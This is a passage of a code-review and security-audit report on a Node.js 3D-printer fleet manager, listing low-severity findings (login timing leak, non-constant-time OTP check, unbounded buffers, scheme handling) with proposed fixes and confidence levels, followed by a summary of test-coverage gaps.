  future edit added a broader `COPY . .`.
- **Scenario**: Two image builds of the exact same commit, days apart, can
  resolve different patch versions of `express` (currently pinned as
  `^4.19.2` in `package.json`), defeating the purpose of committing a
  lockfile at all.
- **Fix**: `COPY package.json package-lock.json ./` and
  `npm ci --omit=dev`.
- **Confidence**: High.

---

### Low

- **L-1. Login endpoint has a username-enumeration timing side-channel** — `server.js:1458-1468`/`auth.js`: `/api/login` returns immediately for a nonexistent login name but performs a real `scrypt` computation (tens of ms by design) for an existing one before returning the same generic error either way, making account existence distinguishable by response latency. *Fix*: perform a dummy-but-comparable-cost hash comparison on the not-found path too. *Confidence: Medium.*
- **L-2. OTP code comparison is not constant-time** — `auth.js:100`: `String(code||"").toUpperCase() !== entry.code` is a plain string comparison. Low real-world risk given the 5-attempt cap and 10-minute TTL, but inconsistent with the `crypto.timingSafeEqual` used for passwords. *Confidence: Low.*
- **L-3. Camera WebSocket URL hardcodes `ws://`, ignoring the printer's configured scheme** — `connectors/snapmaker-u1-klipper.js` (`cameraRpc`, ~`:186-188`): builds the RPC URL as `ws://` unconditionally while every other call on the same connector respects `p.url`'s actual scheme; a TLS-fronted printer's camera preview silently fails while everything else works. *Fix*: derive `ws:`/`wss:` from the parsed URL's protocol. *Confidence: Medium.*
- **L-4. FlashForge `listFiles` returns `null` size/modified, breaking the implicit cross-connector contract** — `connectors/flashforge-utils.js` (~`:175-178`) vs. `connectors/http-utils.js:101-107`: the Klipper family always returns numeric `size`/`modified` and sorts by recency; FlashForge always returns `null` for both and doesn't sort. Any shared frontend formatting/sorting logic that assumes numeric values will render "NaN"/"Invalid Date" or an unsorted list specifically for FlashForge printers. *Confidence: Low-Medium (downstream breakage plausible but not independently confirmed against every `app.js` call site).*
- **L-5. Unbounded stdout/stderr line buffers in the cloudflared supervisor** — `remote-access/CloudflaredManager.js:255-269`: `stdoutBuf`/`stderrBuf` grow without a maximum size until a newline appears; a future incompatible binary emitting non-newline-terminated or binary garbage would grow these unbounded. *Fix*: cap buffer length and drop/flush past a threshold. *Confidence: Low.*
- **L-6. `rotateTunnelToken`/`getHubStatus` are implemented and unit-tested but never called from the orchestrator** — `remote-access/RemoteAccessApiClient.js:238-259` vs. `remote-access/RemoteAccessService.js` (no reference). A leaked/compromised tunnel token currently has no recovery path short of full Remove + re-register. May be intentional pending backend rollout, but reads as dead code/a silent feature gap either way. *Confidence: Medium.*
- **L-7. `refreshPlate()` has no in-flight/ordering guard, unlike `loadFleet()`** — `public/app.js` (`openPlate`/`refreshPlate`, polled every 3s while the exclude-object modal is open): a slow response can be overtaken by a later request and arrive out of order, transiently showing stale exclude-object state in the one UI whose entire purpose is showing what can still safely be skipped mid-print. *Fix*: add the same in-flight guard `loadFleet()` already uses, or a request-sequence token. *Confidence: Medium.*
- **L-8. `config.json` bind mount silently becomes a directory if the file doesn't exist yet** — `docker-compose.yml:30`: Docker creates an empty directory for a missing bind-mount source; the compose file's own quick-start instructions tell users to `cp config.example.json config.json` first, but nothing enforces it, and skipping that step produces an opaque `EISDIR` at startup. *Confidence: Medium.*
- **L-9. No release-time check that `package.json`/`server.js`'s `VERSION` matches the pushed git tag** — `.github/workflows/release.yml`; `package.json:3`; `server.js:6`: currently both say "0.4.1" so there's no active bug, but nothing in the workflow would catch a future tag/version drift, and the app self-reports its baked-in `VERSION` string in the UI/API regardless of what tag it was built from. *Confidence: Medium.*
- **L-10. `capture-proxy.js` always speaks plain HTTP even against an `https://` target** — `capture-proxy.js:13,34,78,88,127-130`: the usage regex accepts `https://` input and special-cases port 443, but every forwarded request still uses the `http` module. Standalone diagnostic tool, not wired into `server.js` (confirmed via repo-wide grep) — low stakes, but silently misleading given the tool's own input validation implies HTTPS support. *Confidence: Medium.*
- **L-11. Unbounded per-file `cfg`/`hist` dictionaries returned by the parser** — `parser.js:64,75,131`: neither the parsed-config map nor the command-frequency histogram is size-capped (only the human-readable `cfgLines` preview is capped at 50); a file with a very large number of distinct comment "keys" inflates memory and produces an oversized `/api/map` JSON response. *Fix*: cap the number of retained keys, mirroring the existing `cfgLines` cap. *Confidence: Medium.*

---

## Test coverage gaps

Only `test/remote-access/**` has any automated coverage — `server.js`
(~2150 lines, every HTTP route including all file-path handling), `auth.js`
(login/session/OTP/role checks), every printer connector, `parser.js`, and
the entire `public/app.js` frontend have **zero** automated tests. Concretely,
the highest-risk gaps this review surfaced:

- **`parser.js`**: no test would have caught either C-2 (ReDoS) or H-1
  (unbounded-loop/stack-overflow) — a basic fuzz/property test feeding long
  lines, lines with no `=`, and large `T<n>` values would have caught both
  before they shipped.
- **`server.js` file-path handling**: `safePath()`/the duplicated
  `startsWith(FOLDER)` checks (M-1) have no test asserting sibling-directory
  isolation; a future refactor could silently reopen or worsen this with
  nothing to catch it.
- **`auth.js`**: no test covers login, session sliding-expiry, OTP, or the
  three role-guard functions; the biggest risk is a silent auth-bypass (e.g.
  in the implicit-admin fallback inside `makeAuthMiddleware`) shipping
  unnoticed.
- **Connectors**: no test across any of the six connector modules; the
  biggest risk is `probe()` silently returning a malformed/partial status
  shape after a firmware update on one brand, corrupting that brand's fleet
  cards with nothing to catch the regression.
- **Remote Access (existing suite)**: despite being the one tested area, it
  specifically has no test for: a child process that emits `'error'` without
  `'exit'` (exactly the branch behind C-5); `stop()` called on a process that
  never finished spawning; a corrupted/malformed stored key reaching
  `completeRegistrationAndProvision` (H-2); atomic-write behavior of
  `RemoteAccessStore.save()` or either `SecureCredentialStore.set()` path
  (M-3); or two genuinely concurrent SnapCon processes racing
  `InstanceLock.resolveBeforeStart()`.
- **Frontend (`app.js`)**: no test coverage at all; `statusColorText()` is
  documented in `CLAUDE.md` as the single source of truth for status-badge
  color/label across both the card grid and list view — a broken mapping
  there would silently mis-render fleet status everywhere with nothing to
  catch it.
- **Settings live-reload (`POST /api/config`)**: no integration test covers
  the interaction between `usersEnabled` and the actual presence of
  `users.json` — an integration test mounting/recreating state the way
  H-3's Docker scenario does would have surfaced that gap directly.
